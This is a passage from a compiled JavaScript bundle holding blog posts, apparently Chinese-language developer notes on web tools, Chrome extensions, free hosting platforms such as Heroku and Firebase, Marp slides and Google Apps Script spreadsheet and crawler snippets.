程式碼的執行邏輯</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsoneditoronline.org/\">JSON Editor</a></td>\n<td>線上 JSON 結構化編輯器</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/keisuuuuke/items/e7b5cc6a5db04f2c8d5c\">データ分析・可視化に本気でおすすめのツール 30 選</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"chrome-插件\">Chrome 插件</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/baby-degu/items/6bbe49b2429b4cfade34\">2020 年向け 開発者向けブラウザ拡張機能９選</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/colorzilla/bhlhnicpbhignbdhedgjhgdocnmhomnp?hl=zh-TW\">ColorZilla</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/cssviewer/ggfgijbpiheegefliciemofobhmofgce\">CSSViewer</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/dimensions/baocaagndhipibgklemoalmkljaimfdj?hl=zh-TW\">Dimensions</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/icon-search/bkijbakibakefmcoobcnfdkfhhbmgiek\">Icon Search</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/javascript-tracker/pdkjocgjcabjddpnefbdkdeadfancbgh\">JavaScript Tracker</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/jsonview/gmegofmjomhknnokphhckolhcffdaihd\">JSONView</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/page-ruler-redux/giejhjebcalaheckengmchjekofhhmal\">Page Ruler Redux</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/pesticide-for-chrome/bblbgcheenepgnnajgfpiicnbbdmmooh\">Pesticide for Chrome</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/pretty-beautiful-javascri/piekbefgpgdecckjcpffhnacjflfoddg\">Pretty Beautiful Javascript</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/viewport-resizer-%E2%80%93-respon/kapnjjcfcncngkadhpmijlkblpibdcgm\">Viewport Resizer - Responsive Testing Tool</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd\">Vue.js devtools</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg\">Wappalyzer</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/web-developer-checklist/iahamcpedabephpcgkeikbclmaljebjp\">Web Developer Checklist</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/whatfont/jabopobgcpjmedljpbcaablpmlmfcogm\">WhatFont</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n","date":"2019-07-18T07:17:11.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"7 min read"};

var route_57 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod58
});

var Mod59 = {"title":"Free Hosting Platform","slug":"free-hosting","html":"<h4 id=\"anchor-links-using-remark-slug\">Anchor links using remark-slug</h4>\n<ul>\n<li><a onclick=\"document.location.hash='heroku';\" href=\"javascript:;\">Heroku</a></li>\n<li><a onclick=\"document.location.hash='netlify';\" href=\"javascript:;\">Netlify</a></li>\n<li><a onclick=\"document.location.hash='vercel';\" href=\"javascript:;\">Vercel</a></li>\n<li><a onclick=\"document.location.hash='firebase';\" href=\"javascript:;\">Firebase</a></li>\n<li><a onclick=\"document.location.hash='amazon-aws';\" href=\"javascript:;\">Amazon AWS</a></li>\n</ul>\n<h2 id=\"heroku\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.heroku.com/\">Heroku</a></h2>\n<h3 id=\"環境建置\">環境建置</h3>\n<h4 id=\"安裝\">安裝</h4>\n<ul>\n<li>node.js 版本須 &gt; 8</li>\n<li>須安裝 npm</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up\">Getting Started on Heroku with Node.js</a></li>\n</ul>\n<h4 id=\"登入\">登入</h4>\n<p><code>heroku login</code></p>\n<h3 id=\"部署\">部署</h3>\n<h4 id=\"創建-git-與連結-app\">創建 Git 與連結 App</h4>\n<pre class=\"language-bash\"><code class=\"language-bash\">git init\ngit add .\ngit commit -m 'first commit'\n\nheroku create [app-name]\nheroku git:remote -a [app-name]\n\ngit push heroku master</code></pre><p>heroku 需要 start 指令才可建置專案，因此需於 <code>package.json</code> 裡加入:</p>\n<pre class=\"language-json\"><code class=\"language-json\">\"scripts\": {\n  \"test\": echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\",\n  \"start\": \"node index.js\"\n},</code></pre><p>修改專案名稱: <code>heroku apps:rename --app [old-name] [new-name]</code>\n檢視遠端連結: <code>git remote -v</code></p>\n<pre class=\"language-\"><code class=\"language-\">\n### 設置 MySQL\n\n```bash\nheroku addons:create cleardb:ignite\nheroku config | grep CLEARDB_DATABASE_URL</code></pre><h2 id=\"netlify\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.netlify.com/\">Netlify</a></h2>\n<h2 id=\"vercel\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://vercel.com/\">Vercel</a></h2>\n<h2 id=\"firebase\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/\">Firebase</a></h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://console.firebase.google.com/u/0/\">Firebase console</a></li>\n<li>BaaS (Backend as a Service)</li>\n</ul>\n<h3 id=\"介紹\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/uhooi/items/aa6945a5da5dd6172d2b\">介紹</a></h3>\n<ol>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/firestore\">Cloud Firestore</a>\n<br>├ NoSQL Database\n<br>├ 範例：\n<br>├ iOS App (Swift): <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook/blob/master/UhooiPicBook/Repository/Monsters/MonstersRepository.swift\">UhooiPicBook/MonstersRepository.swift</a>\n<br>├ Android App (Kotlin): <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook-Android/blob/master/app/src/main/java/com/theuhooi/uhooipicbook/repository/monsters/firebase/MonstersFirestoreClient.kt\">UhooiPicBook-Android/MonstersFirestoreClient.kt</a>\n<br>│ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook-Android/blob/master/app/src/main/java/com/theuhooi/uhooipicbook/modules/monsterlist/entities/MonsterItem.kt\">UhooiPicBook-Android/MonsterItem.kt</a>\n<br>└ Security Rule Test (Typescript): <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook-Firebase\">uhooi/UhooiPicBook-Firebase</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/functions\">Cloud Functions</a>\n<br>└ 執行 serverless back-end code</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/auth\">Authentication</a>\n<br>├ 認證系統\n<br>└ 實裝登入功能</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/hosting\">Hosting</a>\n<br>├ Web Hosting\n<br>└ 實裝 LP、PWA</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/storage\">Cloud Storage</a>\n<br>├ 雲端外部存放空間\n<br>└ 儲存與提供圖片、影片檔案</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/realtime-database\">Realtime Database</a>\n<br>├ NoSQL Database\n<br>├ 一般會選用 Firestore\n<br>└ 差異參照：<a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/docs/database/rtdb-vs-firestore\">選擇一個數據庫：Cloud Firestore 或實時數據庫</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/crashlytics\">Crashlytics</a>\n<br>└ 檢視錯誤</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/performance\">Performance Montioring</a>\n<br>└ 計測效能</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/test-lab\">Test Lab</a>\n<br>├ 裝置測試\n<br>└ UI 測試、Monkey Test</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/analytics\">Google Analytics</a>\n<br>└ 分析使用者</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/predictions\">Predictions</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/cloud-messaging\">Cloud Messaging</a>\n<br>├ 推送通知\n<br>├ 範例：\n<br>│ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook/pull/88\">Implement the foundation for remote push notifications #88</a>\n<br>└ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/uhooi/UhooiPicBook-Android/pull/57\">Implement the foundation for remote push notifications #57</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/remote-config\">Remote Config</a>\n<br>├ 遠端變更 App 設定\n<br>└ 期間限定外觀、A/B Test</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://firebase.google.com/products/dynamic-links\">Dynamic Links</a>\n<br>├ Deep Link\n<br>└ 生成一連結，讓使用者已安裝則啟動 App，未安裝則移動至 Store</li>\n</ol>\n<h3 id=\"使用\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/iiizoo/items/a31726966c1a42f37809\">使用</a></h3>\n<ol>\n<li>新建 Project</li>\n<li>從左上齒輪設定 Soruce Location</li>\n<li>新增 App</li>\n<li><code>npm i -g firebase-tools</code></li>\n<li>移動至作業資料夾</li>\n<li><code>npm i --save firebase</code></li>\n<li><code>firebase login</code></li>\n<li><code>firebase init</code></li>\n<li><code>firebase deploy</code></li>\n</ol>\n<h3 id=\"gcp\">GCP</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2020/06/21/github-apps-cloudfunction/\">利用 Cloud function 製作 GitHub Apps</a></li>\n</ul>\n<h2 id=\"amazon-aws\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://aws.amazon.com/tw/\">Amazon AWS</a></h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://serverless.ink/\">Serverless 架構應用開發指南 - serverless</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/visuallylab/%E4%BD%BF%E7%94%A8-node-js-serverless-framework-aws-lambda-%E6%89%93%E9%80%A0%E5%8F%AF%E6%93%B4%E5%B1%95-%E6%9B%B4%E7%A9%A9%E5%AE%9A%E8%80%8C%E4%B8%94%E6%9B%B4%E7%B6%93%E6%BF%9F%E7%9A%84%E6%9E%B6%E6%A7%8B-6a54b51b8988\">使用 Node.js + serverless framework + AWS Lambda 打造可擴展、更穩定而且更經濟的架構</a></li>\n</ul>\n","date":"2020-01-19T12:37:01.000Z","excerpt":"","printDate":"January 19, 2020","printReadingTime":"2 min read"};

var route_61 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod59
});

var Mod60 = {"title":"從 Markdown 檔案產生投影片","slug":"generate-presentation-from-markdown","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/tomo_makes/items/aafae4021986553ae1d8?utm_campaign=01e7c5f867-Qiita_newsletter_418_07_08_2020&amp;utm_term=0_e44feaa081-01e7c5f867-34565689\">【VS Code + Marp】Markdown から爆速・自由自在なデザインで、プレゼンスライドを作る - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=marp-team.marp-vscode\">Marp for VS Code - Visual Studio Marketplace</a></li>\n</ul>\n","date":"2020-07-11T20:13:35.000Z","excerpt":"","printDate":"July 11, 2020","printReadingTime":"1 min read"};

var route_16 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod60
});

var Mod61 = {"title":"Google App Script","slug":"google-app-script","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/contributorpw/google-apps-script-awesome-list#parsing\">contributorpw/google-apps-script-awesome-list: The usual list of links to interesting resources for Google Apps Script</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/matsu7089/items/6ea7931e97ae703f6607?utm_campaign=6922a8b5e9-Qiita_newsletter_419_07_15_2020&amp;utm_term=0_e44feaa081-6922a8b5e9-34565689#%E3%83%87%E3%83%BC%E3%82%BF%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B-onget-%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B\">【GAS x Vue.js】JavaScript のみで今、家計簿をつくるとしたら【ハンズオン付き！】 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/hironobu-igawa/items/9b5c224d9bbe7b9843be\">【初心者向け Tips】単純作業はもう嫌だ！GAS ツール作りの 4 つの技 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/FUJIvillage/items/e22ad7efdf7fc898ffda\">Google Apps Script（GAS）を利用した業務改善 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mitonattou919/items/de415bb9302a52d52e2e\">Google Apps Script の割り当て値と制限値 - Qiita</a></li>\n</ul>\n<h2 id=\"get--post\">GET / POST</h2>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> target <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>parameter<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">;</span>\n  <span class=\"token function\">getHandler</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> parameter <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>postData<span class=\"token punctuation\">.</span>contents<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> target <span class=\"token operator\">=</span> parameter<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">;</span>\n  <span class=\"token function\">postHandler</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"sheet-handler\">Sheet Handler</h2>\n<h3 id=\"read\">Read</h3>\n<ul>\n<li><code>SpreadsheetApp.getActiveSpreadsheet()</code></li>\n<li><code>Spreadsheet#getSheetByName(name)</code></li>\n<li><code>Sheet#getRange(row, column)</code></li>\n<li><code>Sheet#getRange(row, column, numRows)</code></li>\n<li><code>Sheet#getRange(row, column, numRows, numColumns)</code></li>\n<li><code>Sheet#getRange(cellRangeNotation)</code>\n<br>└ ex: <code>getRange(&quot;A1:B2&quot;)</code></li>\n<li><code>Range#getValues()</code>\n<br>│ ex. <code>const values = sheet.getRange(&quot;A1:C2&quot;).getValues();</code>\n<br>└ <code>const values = sheet.getRange(&quot;A1:C2&quot;).getValues().flat();</code></li>\n</ul>\n<h3 id=\"write\">Write</h3>\n<ul>\n<li><code>Range#setValues(values)</code></li>\n</ul>\n<h4 id=\"寫入整個陣列內容\">寫入整個陣列內容</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> rowLength <span class=\"token operator\">=</span> array<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> colLength <span class=\"token operator\">=</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\nsheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rowLength<span class=\"token punctuation\">,</span> colLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setValues</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"edit-trigger\">Edit Trigger</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">onEdit</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//目当てのシートでなければ中断</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>range<span class=\"token punctuation\">.</span><span class=\"token function\">getSheet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSheetName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token string\">\"シート名\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">//ヘッダ行だった場合も中断</span>\n  <span class=\"token keyword\">const</span> row <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>range<span class=\"token punctuation\">.</span><span class=\"token function\">getRow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>row <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">var</span> date <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> today <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">formatDate</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Asia/Tokyo\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"yyyy/MM/dd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> time <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">formatDate</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Asia/Tokyo\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HH:mm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">//A1セルに８桁の年月日 B1セルに２４時間表記の時刻</span>\n  <span class=\"token keyword\">var</span> spreadsheet <span class=\"token operator\">=</span> SpreadsheetApp<span class=\"token punctuation\">.</span><span class=\"token function\">getActiveSpreadsheet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSheetByName</span><span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"シート名\"</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  spreadsheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>today<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  spreadsheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"B1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"use-library\">Use Library</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/shikumiya_hata/items/5e11ff875a9dd050a722\">GAS でライブラリを使う・作る方法 - Qiita</a></li>\n<li>開啟 App Script 程式碼頁面\n<br>├ -&gt; Resources -&gt; Libraries\n<br>├ -&gt; 複製 cheeriogs 的說明頁面裡的 script ID\n<br>└ -&gt; 貼至下方的 add library -&gt; 追加</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/TakeshiNickOsanai/items/62810b0e96bf37bd0eca\">Google Apps Script + OAuth ライブラリで、freee API の操作を行う - Qiita</a></li>\n</ul>\n<h2 id=\"crawler\">Crawler</h2>\n<h3 id=\"urlfetchapp\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/apps-script/reference/url-fetch/url-fetch-app\">UrlFetchApp</a></h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yamaguchi_yo/items/09bfc5c32faffa3beb62\">法改正情報を早く確実にキャッチするために GAS で自動化するツールを作って運用してみた。 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/cyoi0129/items/1cafb446dbe176e9366e\">スクレイピングいろいろ - Qiita</a></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> sheet <span class=\"token operator\">=</span> SpreadsheetApp<span class=\"token punctuation\">.</span><span class=\"token function\">getActiveSpreadsheet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSheetByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"urlリスト\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> rows <span class=\"token operator\">=</span> sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getDataRange</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> numRows <span class=\"token operator\">=</span> rows<span class=\"token punctuation\">.</span><span class=\"token function\">getNumRows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> values <span class=\"token operator\">=</span> rows<span class=\"token punctuation\">.</span><span class=\"token function\">getValues</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 一行ずつチェック</span>\n<span class=\"token keyword\">var</span> results <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> numRows <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">var</span> row <span class=\"token operator\">=</span> values<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// GSSから対象URLの値を取得</span>\n  <span class=\"token keyword\">var</span> name <span class=\"token operator\">=</span> row<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> row<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 前回のハッシュ値</span>\n  <span class=\"token keyword\">var</span> hash <span class=\"token operator\">=</span> row<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// htmlを取得</span>\n  <span class=\"token keyword\">var</span> html <span class=\"token operator\">=</span> UrlFetchApp<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> text <span class=\"token operator\">=</span> html<span class=\"token punctuation\">.</span><span class=\"token function\">getContentText</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// ハッシュ値を計算</span>\n  <span class=\"token keyword\">var</span> md5bin <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">computeDigest</span><span class=\"token punctuation\">(</span>Utilities<span class=\"token punctuation\">.</span>DigestAlgorithm<span class=\"token punctuation\">.</span><span class=\"token constant\">MD5</span><span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> md5 <span class=\"token operator\">=</span> Utilities<span class=\"token punctuation\">.</span><span class=\"token function\">base64Encode</span><span class=\"token punctuation\">(</span>md5bin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 前回と同じならスキップ</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hash <span class=\"token operator\">==</span> md5<span class=\"token punctuation\">)</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n  results<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  sheet<span class=\"token punctuation\">.</span><span class=\"token function\">getRange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>md5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>results<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  Logger<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"更新はありませんでした。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h3 id=\"cheeriogs\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/tani/cheeriogs\">Cheeriogs</a></h3>\n<ul>\n<li>cheerio 的 Google Sheet 版</li>\n<li>可以用類似 jQuery 的語法解析 HTML 內容</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span 